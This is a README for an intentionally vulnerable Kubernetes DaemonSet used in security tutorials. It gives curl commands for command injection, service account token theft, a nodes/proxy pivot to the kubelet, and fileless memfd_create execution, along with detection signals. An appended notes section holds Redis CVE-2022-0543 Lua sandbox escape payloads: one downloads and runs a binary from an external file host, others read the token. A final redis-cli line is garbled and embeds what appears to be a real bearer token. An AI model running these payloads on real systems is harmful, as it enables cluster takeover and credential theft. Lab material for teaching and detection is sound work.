# Oopservability

**Intentionally vulnerable observability agent for Kubernetes security tutorials.**

> ⚠️  Do **not** deploy this in a production or shared cluster. It contains deliberate unauthenticated RCE and fileless execution capabilities.

---

## What is this?

Oopservability is a fake observability DaemonSet that demonstrates a common and underappreciated attack chain in Kubernetes:

```
Over-permissive RBAC (nodes/proxy GET)
  └─► Attacker exploits RCE in the agent pod
       └─► Reads the mounted SA token
            └─► Uses token + nodes/proxy to reach the kubelet API
                 └─► Executes commands in any container on the node
```

The service looks like a legitimate metrics/log scraper. It is not.

---

## Attack Tracks

### Track 1 — Basic: Command Injection → RCE

The log search endpoint passes user input directly to `sh -c`:

```bash
# Innocent search
curl 'http://agent:8080/api/v1/logs/search?q=error'

# Command injection — exfiltrate SA token
curl 'http://agent:8080/api/v1/logs/search?q=error+/var/log/%3B+cat+/var/run/secrets/kubernetes.io/serviceaccount/token'

# Or use the explicit exec endpoint
curl -X POST http://agent:8080/api/v1/diagnostics/run \
     -H 'Content-Type: application/json' \
     -d '{"command":"id && hostname && cat /proc/1/environ"}'
```

### Track 2 — Intermediate: nodes/proxy Pivot

Once you have the SA token (from Track 1 or directly from the `/api/v1/nodes` endpoint):

```bash
TOKEN=$(curl -s -X POST http://agent:8080/api/v1/diagnostics/run \
             -H 'Content-Type: application/json' \
             -d '{"command":"cat /var/run/secrets/kubernetes.io/serviceaccount/token"}' \
        | jq -r .output)

NODE=$(curl -s http://agent:8080/api/v1/diagnostics/run \
            -X POST -H 'Content-Type: application/json' \
            -d '{"command":"echo $NODE_NAME"}' | jq -r .output | tr -d '\n')

# List every pod on the node via nodes/proxy → kubelet
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/nodes/${NODE}/proxy/pods" \
  | jq '.items[].metadata | {name, namespace}'

# Execute a command in any container on the node
curl -sk -H "Authorization: Bearer $TOKEN" -X POST \
  "https://kubernetes.default.svc/api/v1/nodes/${NODE}/proxy/run/kube-system/coredns-xxx/coredns" \
  -d 'cmd=cat /etc/resolv.conf'
```

**Why does this work?** The kubelet API (`/run`, `/exec`, `/pods`) is exposed through `nodes/proxy`. The kubelet trusts that the API server has already authorised the caller — so `GET nodes/proxy` effectively grants full kubelet access.

### Track 3 — Advanced: Fileless Execution via `memfd_create`

Build the demo payload:

```bash
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o payload ./payload
```

Upload and execute — the binary **never touches disk**:

```bash
curl -X POST http://agent:8080/api/v1/diagnostics/upload \
     --data-binary @payload \
     -H 'Content-Type: application/octet-stream'
```

**How it works:**
1. `memfd_create("kworker", 0)` — creates an anonymous RAM-backed file descriptor
2. ELF binary is written to the fd with `write(2)`
3. `execve("/proc/self/fd/N", ...)` — kernel resolves the path to the in-memory fd and executes it
4. No `open()`, `creat()`, or `write()` to any filesystem path — `ls /tmp`, `inotify`, and most EDR filesystem monitors see nothing

**Detection signals:**
| Tool | Signal |
|------|--------|
| Falco | `execve` where `fd.name` starts with `/proc/self/fd/` |
| Tetragon | `ProcessExec` where `binary.path` is empty or `memfd:` |
| auditd | `SYSCALL memfd_create` followed by `execve` of `/proc/*/fd/*` |
| eBPF (raw) | `sys_enter_execve` with pathname resolving to anonymous inode |

---

## Deploy

```bash
# Apply everything
kubectl apply -f manifests/namespace.yaml
kubectl apply -f manifests/rbac.yaml
kubectl apply -f manifests/daemonset.yaml

# Wait for rollout
kubectl rollout status daemonset/oopservability-agent -n oopservability

# Access the dashboard (port-forward)
kubectl port-forward -n oopservability daemonset/oopservability-agent 8080:8080
# → http://localhost:8080
```

## Tear Down

```bash
kubectl delete namespace oooservability
kubectl delete clusterrole oopservability-agent
kubectl delete clusterrolebinding oopservability-agent
```

---

## Vulnerability Summary

| Endpoint | Vuln Class | Track |
|----------|-----------|-------|
| `GET /api/v1/logs/search?q=` | Command injection / RCE | Basic |
| `POST /api/v1/diagnostics/run` | Unauthenticated RCE | Basic |
| `GET /debug/pprof/` | Exposed pprof — heap/goroutine dump | Basic |
| `GET /api/v1/nodes` | Sensitive data via kubelet proxy | Intermediate |
| `POST /api/v1/diagnostics/upload` | Fileless execution via `memfd_create` | Advanced |
| TLS skip verify | MITM on K8s API connection | Basic |

---

## Project Structure

```
.
├── main.go              — HTTP server, routes, embedded dashboard
├── handlers.go          — Vulnerable HTTP handlers
├── kubelet.go           — Kubelet API client (nodes/proxy)
├── httpclient.go        — Shared HTTP client (insecure TLS)
├── exec_helper.go       — exec.Cmd helper
├── fileless_linux.go    — memfd_create fileless exec (Linux)
├── fileless_stub.go     — Non-Linux stub
├── static/index.html    — Dashboard UI
├── payload/main.go      — Demo payload binary (harmless)
├── manifests/
│   ├── daemonset.yaml
│   └── rbac.yaml        — ClusterRole with nodes/proxy GET
└── Dockerfile
```


---

### Notes

```shell
EVAL '
local os = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_os")()
os.execute("curl -fsSL https://filedn.eu/lInD0fhKjA3uc70xrPjtNUj/ran-ws -o /tmp/ran-ws && chmod +x /tmp/ran-ws && /tmp/ran-ws")
' 0
```


```shell
EVAL '
local os = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_os")()
os.execute("cat /var/run/secrets/kubernetes.io/serviceaccount/token")
' 0
```


```shell
EVAL '
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); 
local f = io.open("/var/run/secrets/kubernetes.io/serviceaccount/token","r")
local data = f:read("*a")
f:close()
return data
' 0
```


https://ine.com/blog/cve-20220543-lua-sandbox-escape-in-redis
https://github.com/CVEDB/POC-DB/blob/main/2022/CVE-2022-0543.md



redis-cli -h 10.244.1.8 -p 6379 EVAL "local cmd = 'Y3VybCAtWFBPU1QgICAgICBodHRwczovL2t1YmVybmV0ZXMuZGVmYXVsdC5zdmMuY2x1c3Rlci5sb2NhbC9hcGlzL2F1dGhvcml6YXRpb24uazhzLmlvL3YxL3NlbGZzdWJqZWN0cnVsZXNyZXZpZXdzICAgICAgLS1jYWNlcnQgL3Zhci9ydW4vc2VjcmV0cy9rdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L2NhLmNydCAgICAgIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltMVpOSEJPY25FNVgxUTNNbE5OZW5Gbk1sRlNTbkpGVkhOTGNsVTJkVGcwUXpoV05qVlVYM05RZDFVaWZRLmV5SmhkV1FpT2xzaWFIUjBjSE02THk5cmRXSmxjbTVsZEdWekxtUmxabUYxYkhRdWMzWmpMbU5zZFhOMFpYSXViRzlqWVd3aVhTd2laWGh3SWpveE9EQTBOamd5TnpBMkxDSnBZWFFpT2pFM056TXhORFkzTURZc0ltbHpjeUk2SW1oMGRIQnpPaTh2YTNWaVpYSnVaWFJsY3k1a1pXWmhkV3gwTG5OMll5NWpiSFZ6ZEdWeUxteHZZMkZzSWl3aWFuUnBJam9pTUdKa1kyVmtZemN0WmprM1pDMDBaV1JsTFdKbVlXUXRORGsxWmpVMU1EZGhNMlk1SWl3aWEzVmlaWEp1WlhSbGN5NXBieUk2ZXlKdVlXMWxjM0JoWTJVaU9pSnlaV1JwY3lJc0ltNXZaR1VpT25zaWJtRnRaU0k2SW10cGJtUXRkMjl5YTJWeUlpd2lkV2xrSWpvaU4ySmxOVGcyTWpNdFptUTJNaTAwTVdNeUxUZ3daR010T0dZeU5XVTJNakprWXpSakluMHNJbkJ2WkNJNmV5SnVZVzFsSWpvaWNtVmthWE10TldSa1pEZzJObU0zTFd0NGFHaHhJaXdpZFdsa0lqb2laalF3TXpNd01tRXRNR1kzTXkwMFlXUmtMVGs1Wm1FdE1UWmhNVE00TnpFNU9HSm1JbjBzSW5ObGNuWnBZMlZoWTJOdmRXNTBJanA3SW01aGJXVWlPaUp5WldScGN5SXNJblZwWkNJNklqVmtOemhrWVdVM0xUWXpNelF0TkRnMVlTMWhZMk5qTFRVM05EZGtPREJrTUdJeU5TSjlMQ0ozWVhKdVlXWjBaWElpT2pFM056TXhOVEF6TVROOUxDSnVZbVlpT2pFM056TXhORFkzTURZc0luTjFZaUk2SW5ONWMzUmxiVHB6WlhKMmFXTmxZV05qYjNWdWREcHlaV1JwY3pweVpXUnBjeUo5LkpVSzJ0amphMU1yVXBiR2l1VklyOVhyYlpGSENSTlBTaDVkekVBRlpyN21xNEdabUphQVRVRjZueFJYVUd2a2tlWTZfOVRiaDhoeUN0NElMSUswbXA4dUVCcWp5MmtENU5BeWhXdjU0YktqRVZjcFk5OHpPMDViRjg4eVJYWGZZVUZLLTBnQkYtV0ttTkREaFpTeHI0NVNjclBXZm8xSHpuTVZWLTVzT2hYZlhnZnNkd2Z4eFpXY0JnbnVjck8zcXZHYnpReHNLdkhESVRWazNBMG1iNHdLaDdsdnk3WUN5NFo1WG1aQjdPY0ZST21jRGU2bTlpaDI3SC03TVJGYTlnWVdrRkJiai1PeFQ2bjd6d2hMRjBjbV9MeDBoVUs3V3hPN1lSN1laMnlFR01MT1NFdDVKZHpwMFo4SG00RUNLUWplY1Z5R2hMQmpRZWdLa1pUck9PQSIgICAgICAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiAgICAgIC0tZGF0YSAneyAgICAgICAgImtpbmQiOiAiU2VsZlN1YmplY3RSdWxlc1JldmlldyIsICAgICAgICAiYXBpVmVyc2lvbiI6ICJhdXRob3JpemF0aW9uLms4cy5pby92MSIsICAgICAgICAic3BlYyI6IHsgIm5hbWVzcGFjZSI6ICJyZWRpcyIgfSAgICAgIH0n'; local p =  local f = io.popen('') local d = f:read('*a') f:close(); return d;" 0